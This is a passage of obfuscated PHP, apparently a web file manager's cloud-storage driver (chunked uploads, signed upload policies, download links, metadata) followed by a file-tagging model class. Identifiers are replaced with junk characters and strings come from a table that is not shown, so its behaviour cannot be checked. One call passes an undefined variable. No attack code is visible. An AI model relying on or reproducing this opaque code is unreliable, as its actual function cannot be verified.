} } return $this->listAllFiles($Ê¯·ïı³, array_keys($á¡±ˆæ), $á¡±ˆæ); } public function canRead($Šö†ˆö°) { return $this->exist($Šö†ˆö°) ? !0 : !1; } public function canWrite($¹‡áƒÂø) { return $this->exist($¹‡áƒÂø) ? !0 : !1; } public function getContent($ÇıÕÊ«) { return $this->fileSubstr($ÇıÕÊ«, 0, -1); } public function setContent($ùØ¿–ª†, $’ãÚ£·² = '') { $¸Ùû’ÚÔ =& $_SERVER[Æ š¦İÈ]; if (!$’ãÚ£·²) { $À¥Áì¥¸ = $this->ussRequest($ùØ¿–ª†, $¸Ùû’ÚÔ[223]); return $À¥Áì¥¸[$¸Ùû’ÚÔ[1180]]; } $À—Ÿšš¯ = $this->tempFile($this->pathThis($ùØ¿–ª†)); file_put_contents($À—Ÿšš¯, $’ãÚ£·²); if ($this->upload($ùØ¿–ª†, $À—Ÿšš¯)) { $this->tempFileRemve($À—Ÿšš¯); return !0; } return !1; } public function fileSubstr($Â¸¡°¬…, $ËùÛÊœ, $œ‰ôĞŞÄ) { $Ü¡Ş©¡ =& $_SERVER[Æ š¦İÈ]; if (!($¾ÖÅÅñ¯ = $this->link($Â¸¡°¬…))) { return !1; } $Ö¯­—°Ñ = !1; if ($œ‰ôĞŞÄ > 0) { $Ö‡ÏÜ•¢ = $ËùÛÊœ + $œ‰ôĞŞÄ - 1; $Ö¯­—°Ñ = array($Ü¡Ş©¡[1421] . $ËùÛÊœ . $Ü¡Ş©¡[462] . $Ö‡ÏÜ•¢); } $ßÎˆú£ = url_request($¾ÖÅÅñ¯, $Ü¡Ş©¡[227], !1, $Ö¯­—°Ñ); return $ßÎˆú£[$Ü¡Ş©¡[747]] ? $ßÎˆú£[$Ü¡Ş©¡[1182]] : !1; } public function upload($øÜˆ†Â¸, $ÒÎºÏƒ, $ÚŠêæç› = false, $î¬æÖó = REPEAT_REPLACE) { $œØä½ê… =& $_SERVER[Æ š¦İÈ]; $ìôíøÌ¿ = IO::size($ÒÎºÏƒ); if ($ìôíøÌ¿ <= 1024 * 1024 * 200) { $Î¿Œ¡Ê = array($œØä½ê…[1461] . $ÒÎºÏƒ); $§™Û¤°á = $this->ussRequest($øÜˆ†Â¸, $œØä½ê…[225], $Î¿Œ¡Ê); return $§™Û¤°á[$œØä½ê…[1180]] ? $this->getPathOuter($øÜˆ†Â¸) : !1; } $¹ı¹É£Ç = 1024 * 1024 * 10; $¤êãä˜ = array($œØä½ê…[1462], $œØä½ê…[1463] . $ìôíøÌ¿, $œØä½ê…[1464], $œØä½ê…[1465] . $¹ı¹É£Ç); $§™Û¤°á = $this->ussRequest($øÜˆ†Â¸, $œØä½ê…[225], !1, $¤êãä˜); if (!$§™Û¤°á[$œØä½ê…[1180]]) { return !1; } $½¥ƒçˆ› = $§™Û¤°á[$œØä½ê…[1182]]; $öÖ¯æˆï = 0; $Ü±Ôúêú = $½¥ƒçˆ›[$œØä½ê…[1466]]; $Å­ŞÕì‡ = fopen($ÒÎºÏƒ, $œØä½ê…[1370]); if (!$Å­ŞÕì‡) { return !1; } do { $Ë‰”»ƒı = $½¥ƒçˆ›[$œØä½ê…[1467]]; fseek_64($Å­ŞÕì‡, $öÖ¯æˆï); $¥ÄëÕ‡ = fread($Å­ŞÕì‡, $Ë‰”»ƒı); $ğ·ÛÅÉ = 0; do { $ğ·ÛÅÉ++; $½¥ƒçˆ› = $this->uploadPart($øÜˆ†Â¸, $½¥ƒçˆ›, $¥ÄëÕ‡); } while (!$½¥ƒçˆ› && $ğ·ÛÅÉ < 3); if (!$½¥ƒçˆ›) { return !1; } $Ü±Ôúêú = $½¥ƒçˆ›[$œØä½ê…[1466]]; $öÖ¯æˆï += $Ë‰”»ƒı; } while ($Ü±Ôúêú != -1); fclose($Å­ŞÕì‡); $¤êãä˜ = array($œØä½ê…[1468], $œØä½ê…[1469] . $½¥ƒçˆ›[$œØä½ê…[1470]], $œØä½ê…[1464]); $§™Û¤°á = $this->ussRequest($øÜˆ†Â¸, $œØä½ê…[225], !1, $¤êãä˜); return $§™Û¤°á[$œØä½ê…[1180]] ? $this->getPathOuter($ÔåååƒÁ) : !1; } private function uploadPart($€ ÜâÚÅ, $îÜ“²ÁÚ, &$µ‘ÂÁÔó) { $¢çÂòÊŸ =& $_SERVER[Æ š¦İÈ]; $ÂÌèŠúÈ = array($¢çÂòÊŸ[1471], $¢çÂòÊŸ[1469] . $îÜ“²ÁÚ[$¢çÂòÊŸ[1470]], $¢çÂòÊŸ[1472] . $îÜ“²ÁÚ[$¢çÂòÊŸ[1466]], $¢çÂòÊŸ[141] . $îÜ“²ÁÚ[$¢çÂòÊŸ[1467]]); $ÆÆÎëÎĞ = $this->ussRequest($€ ÜâÚÅ, $¢çÂòÊŸ[225], $µ‘ÂÁÔó, $ÂÌèŠúÈ); return !$ÆÆÎëÎĞ[$¢çÂòÊŸ[1180]] ? $ÆÆÎëÎĞ[$¢çÂòÊŸ[1180]] : $ÆÆÎëÎĞ[$¢çÂòÊŸ[1182]]; } public function uploadFormData($å‹æ²¬, $×Ÿ¨ÇÑ¹ = 3600) { return $this->uploadPolicy($å‹æ²¬, $×Ÿ¨ÇÑ¹); } public function multiUploadFormData($§Ş¼Â½ù, $™Ç§š¹† = 3600) { $ƒˆˆŞæ =& $_SERVER[Æ š¦İÈ]; $Û¨ÚŠ’ = (int) $GLOBALS[$ƒˆˆŞæ[7]][$ƒˆˆŞæ[80]]; return $this->uploadPolicy($§Ş¼Â½ù, $™Ç§š¹†, $Û¨ÚŠ’); } private function uploadPolicy($Ï×®şı¯, $ÚÂåáÃ‹ = 3600, $¯—…Ãœâ = 0) { $­Äï¸¶ =& $_SERVER[Æ š¦İÈ]; $’´€£ûš = $­Äï¸¶[8] . $this->bucket; $£»¹Ä×€ = gmdate($­Äï¸¶[1406]); $åè»°½ê = array($­Äï¸¶[1473] => $this->bucket, $­Äï¸¶[1474] => $Ï×®şı¯, $­Äï¸¶[1475] => time() + $ÚÂåáÃ‹, $­Äï¸¶[1476] => $£»¹Ä×€); if ($¯—…Ãœâ) { $åè»°½ê[$­Äï¸¶[1386]] = $¯—…Ãœâ; } $¤ÙÉˆ©’ = base64_encode(json_encode($åè»°½ê)); $ûõ›²³Ü = base64_encode(hash_hmac($­Äï¸¶[1443], "\120\117\123\124\x26{$’´€£ûš}\46{$£»¹Ä×€}\x26{$¤ÙÉˆ©’}", md5("{$this->userpass}"), !0)); $Ù¼×®šÈ = array($­Äï¸¶[1311] => $¤ÙÉˆ©’, $­Äï¸¶[1477] => "\x55\x50\x59\x55\116\x20{$this->username}\x3a{$ûõ›²³Ü}", $­Äï¸¶[176] => $this->endpoint . $’´€£ûš); return $Ù¼×®šÈ; } public function download($ï¿Èï¿Í, $¯«¿ˆ˜š) { $äõ„í¨ = IO::getPathInner(IO::mkfile($¯«¿ˆ˜š)); if (!($ÇÂ‡Ÿû× = $this->link($ï¿Èï¿Í))) { return !1; } $±ÃƒÅò‰ = 0; $ØÕ Š‰ = 1024 * 200; $òŒÑæÑ = fopen($äõ„í¨, $_SERVER[Æ š¦İÈ][1427]); while (!0) { $ÀÛÙö¾ = $this->fileSubstr($ï¿Èï¿Í, $±ÃƒÅò‰, $ØÕ Š‰); if ($ÀÛÙö¾ === !1) { return !1; } fwrite($òŒÑæÑ, $ÀÛÙö¾); $±ÃƒÅò‰ += $ØÕ Š‰; if (strlen($ÀÛÙö¾) < $ØÕ Š‰) { break; } } fclose($òŒÑæÑ); return $¯«¿ˆ˜š; } public function link($ıÖÄíı , $ù¬Á§Äü = array()) { $Çê±ÓÍ  =& $_SERVER[Æ š¦İÈ]; $ıÖÄíı  = trim($ıÖÄíı , $Çê±ÓÍ [8]); if (!empty($this->token)) { $şˆøú¤© = strtotime(date($Çê±ÓÍ [1478])); $ÖÌú•ûŸ = substr(md5($this->token . $Çê±ÓÍ [281] . $şˆøú¤© . $Çê±ÓÍ [1479] . $ıÖÄíı ), 12, 8) . $şˆøú¤©; $ù¬Á§Äü[] = $Çê±ÓÍ [1480] . $ÖÌú•ûŸ; } $¡™Ó©“İ = !empty($ù¬Á§Äü) ? $Çê±ÓÍ [73] . implode($Çê±ÓÍ [281], $ù¬Á§Äü) : $Çê±ÓÍ [12]; return $this->getHost() . $Çê±ÓÍ [8] . $ıÖÄíı  . $¡™Ó©“İ; } public function fileOut($à¾ˆ“Ä¬, $íÆíµŠÈ = false, $—€Şù×Ù = false, $±½ Ãëı = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($à¾ˆ“Ä¬, $íÆíµŠÈ, $—€Şù×Ù, $±½ Ãëı); } if (!$—€Şù×Ù) { $—€Şù×Ù = $this->pathThis($à¾ˆ“Ä¬); } $ÇíĞŞ¢§ = $íÆíµŠÈ ? array($_SERVER[Æ š¦İÈ][1481] . rawurlencode($—€Şù×Ù)) : array(); $¯·“ØÛ‰ = $this->link($à¾ˆ“Ä¬, $ÇíĞŞ¢§); $this->fileOutLink($¯·“ØÛ‰); } public function fileOutServer($ñÀÈ†, $ï™ÚËñ = false, $ßÓ–Üâ = false, $Êœ¶í¨Û = '') { parent::fileOut($ñÀÈ†, $ï™ÚËñ, $ßÓ–Üâ, $Êœ¶í¨Û); } public function fileOutImage($¨ººí‰Ø, $­‹‰© = 250) { $öÂ•Ùí = $this->link($¨ººí‰Ø . $_SERVER[Æ š¦İÈ][1482] . $­‹‰©); $this->fileOutLink($öÂ•Ùí); } public function fileOutImageServer($ˆå˜¦š, $‘ğ¹Ü¹ = 250) { parent::fileOutImage($ˆå˜¦š, $‘ğ¹Ü¹); } public function hashMd5($‘Àñö­) { $ş‹´ÉıÊ =& $_SERVER[Æ š¦İÈ]; $â˜¦ïÆÌ = $this->_objectMeta($‘Àñö­); return isset($â˜¦ïÆÌ[$ş‹´ÉıÊ[209]]) ? $â˜¦ïÆÌ[$ş‹´ÉıÊ[209]] : !1; } public function size($÷ ¦ëË‰) { $Î¥Ï¦ßĞ = $this->objectMeta($÷ ¦ëË‰); return $Î¥Ï¦ßĞ ? $Î¥Ï¦ßĞ[$_SERVER[Æ š¦İÈ][80]] : 0; } public function info($âóÂÈÒé) { if ($this->isFolder($âóÂÈÒé)) { return $this->folderInfo($âóÂÈÒé); } else { if ($this->isFile($âóÂÈÒé)) { return $this->fileInfo($âóÂÈÒé); } } return !1; } public function exist($ì¸¸ìîŒ) { return $this->isFile($ì¸¸ìîŒ) || $this->isFolder($ì¸¸ìîŒ); } public function isFile($Ÿ»‰µ…Ô) { return !$this->isFolder($Ÿ»‰µ…Ô) && $this->objectMeta($Ÿ»‰µ…Ô); } public function isFolder($›ñ¼¸³ø) { return $this->cacheMethod($_SERVER[Æ š¦İÈ][200], $›ñ¼¸³ø); } protected function objectMeta($ƒ¿€¹ÛĞ) { return $this->cacheMethod($_SERVER[Æ š¦İÈ][201], $ƒ¿€¹ÛĞ); } protected function _objectMeta($ü‚‰ÍÊÒ) { $àüÃºæ¥ =& $_SERVER[Æ š¦İÈ]; if ($ü‚‰ÍÊÒ == $àüÃºæ¥[12] || $ü‚‰ÍÊÒ == $àüÃºæ¥[8]) { return array(); } $Ì×Ÿ¿™× = $this->ussRequest($ü‚‰ÍÊÒ, $àüÃºæ¥[1483]); if (!$Ì×Ÿ¿™×[$àüÃºæ¥[1180]]) { return null; } $£§ÛÒ®‰ = isset($Ì×Ÿ¿™×[$àüÃºæ¥[1182]]) ? $Ì×Ÿ¿™×[$àüÃºæ¥[1182]] : array(); if (!isset($£§ÛÒ®‰[$àüÃºæ¥[1484]])) { return null; } $êÉõ£’ì = array($àüÃºæ¥[33] => isset($£§ÛÒ®‰[$àüÃºæ¥[1484]]) ? $£§ÛÒ®‰[$àüÃºæ¥[1484]] : null, $àüÃºæ¥[80] => isset($£§ÛÒ®‰[$àüÃºæ¥[1485]]) ? $£§ÛÒ®‰[$àüÃºæ¥[1485]] : null, $àüÃºæ¥[209] => isset($£§ÛÒ®‰[$àüÃºæ¥[1486]]) ? $£§ÛÒ®‰[$àüÃºæ¥[1486]] : null, $àüÃºæ¥[1453] => isset($£§ÛÒ®‰[$àüÃºæ¥[1487]]) ? $£§ÛÒ®‰[$àüÃºæ¥[1487]] : null); $êÉõ£’ì[$àüÃºæ¥[1454]] = isset($£§ÛÒ®‰[$àüÃºæ¥[1488]]) ? strtotime($£§ÛÒ®‰[$àüÃºæ¥[1488]]) : $êÉõ£’ì[$àüÃºæ¥[1453]]; return $êÉõ£’ì; } protected function _isFolder($‚û¡ëşÈ) { $³ÌØßĞÂ =& $_SERVER[Æ š¦İÈ]; if ($‚û¡ëşÈ == $³ÌØßĞÂ[12] || $‚û¡ëşÈ == $³ÌØßĞÂ[8]) { return !0; } $µ»êèğ = $this->_objectMeta($‚û¡ëşÈ); return isset($µ»êèğ[$³ÌØßĞÂ[33]]) && $µ»êèğ[$³ÌØßĞÂ[33]] == $³ÌØßĞÂ[79] ? !0 : !1; } } $_file = $_SERVER[$_SERVER[Æ š¦İÈ][399]]; goto E›¨×†©ë™; FÔò¬Ş“±…: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($¾„÷Ú¨æ) { $ò­Ã×Ìû =& $_SERVER[Æ š¦İÈ]; return array($ò­Ã×Ìû[1920] => array(USER_ID, $ò­Ã×Ìû[1921])); } protected function listData() { $¨Ì‰ùÇ =& $_SERVER[Æ š¦İÈ]; $ÑŞ«üç’ = array($¨Ì‰ùÇ[1635] => USER_ID, $¨Ì‰ùÇ[485] => array($¨Ì‰ùÇ[1924], 0)); $–ÄÖ“Ç² = $¨Ì‰ùÇ[1926]; $Ë‰µ—ÁÎ = $this->field($–ÄÖ“Ç²)->where($ÑŞ«üç’)->order($¨Ì‰ùÇ[1927])->select(); return $Ë‰µ—ÁÎ ? $Ë‰µ—ÁÎ : array(); } protected function listByTag($†ñ¿¿ºº) { } protected function addToTag($«†¥‰é›, $£ãéÁğ) { $ªÅÚö›« =& $_SERVER[Æ š¦İÈ]; if (!Model($ªÅÚö›«[2061])->listData($£ãéÁğ) || !Model($ªÅÚö›«[822])->pathInfo($«†¥‰é›)) { return !1; } $›À‹‘õ€ = array($ªÅÚö›«[1635] => USER_ID, $ªÅÚö›«[485] => $£ãéÁğ, $ªÅÚö›«[424] => $«†¥‰é›, $ªÅÚö›«[425] => $ªÅÚö›«[419], $ªÅÚö›«[423] => $ªÅÚö›«[12], $ªÅÚö›«[1816] => 0); if ($this->where($›À‹‘õ€)->find()) { return !1; } return $this->add($›À‹‘õ€); } protected function removeFromTag($õ¶÷×…‡, $±µÚ¯ö) { $ç¾Ô”«À =& $_SERVER[Æ š¦İÈ]; if (!Model($ç¾Ô”«À[2061])->listData($±µÚ¯ö)) { return !1; } if (is_array($õ¶÷×…‡)) { $õ¶÷×…‡ = array($ç¾Ô”«À[7], $õ¶÷×…‡); } $îÛÜšş¨ = array($ç¾Ô”«À[1635] => USER_ID, $ç¾Ô”«À[485] => $±µÚ¯ö, $ç¾Ô”«À[425] => $ç¾Ô”«À[419], $ç¾Ô”«À[424] => $õ¶÷×…‡); return $this->where($îÛÜšş¨)->delete(); } protected function removeByTag($¯¯Ñ¨„˜) { $…Ïûı“Ê =& $_SERVER[Æ š¦İÈ]; if (!$¯¯Ñ¨„˜) { return !1; } $Ï†¦‰É = array($…Ïûı“Ê[1635] => USER_ID, $…Ïûı“Ê[485] => $¯¯Ñ¨„˜); return $this->where($Ï†¦‰É)->delete(); } protected function removeBySource($—ŞÜ£) { $¥ù”™àà =& $_SERVER[Æ š¦İÈ]; if (is_array($—ŞÜ£)) { $—ŞÜ£ = array($¥ù”™àà[7], $—ŞÜ£); } $çÙÕ¢Ñ¢ = array($¥ù”™àà[1635] => USER_ID, $¥ù”™àà[424] => $—ŞÜ£, $¥ù”™àà[485] => array($¥ù”™àà[1005], 0)); return $this->where($çÙÕ¢Ñ¢)->delete(); } }